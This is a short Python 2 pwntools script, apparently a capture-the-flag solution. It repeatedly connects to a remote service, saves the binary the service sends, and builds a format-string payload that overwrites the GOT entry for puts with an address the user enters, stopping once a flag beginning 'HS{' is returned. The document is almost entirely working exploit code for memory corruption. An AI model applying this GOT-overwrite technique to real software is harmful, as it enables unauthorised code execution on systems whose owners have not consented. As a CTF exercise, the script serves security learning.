from pwn import *
import os

for i in range(100):
    p = remote('1.224.175.32', 9981)

    binary = p.recvline().strip().decode('base64')
#    print hexdump(binary)

    elf = open('elf.bin', 'w')
    elf.write(binary)
    elf.close()

    os.system('chmod +x ./elf.bin')
    e = ELF('./elf.bin')
    os.system('objdump -d elf.bin | grep "push   %ebp"')
        
    target = int(raw_input(), 16)
    pay = fmtstr_payload(5, {e.got['puts']:target})
    print hex(target)
#    print hexdump(pay)

    p.recv()
    p.sendline(pay)
    os.system('rm ./elf.bin')

    res = p.recv()
    if 'HS{' in res:
        print res
        break
    p.close()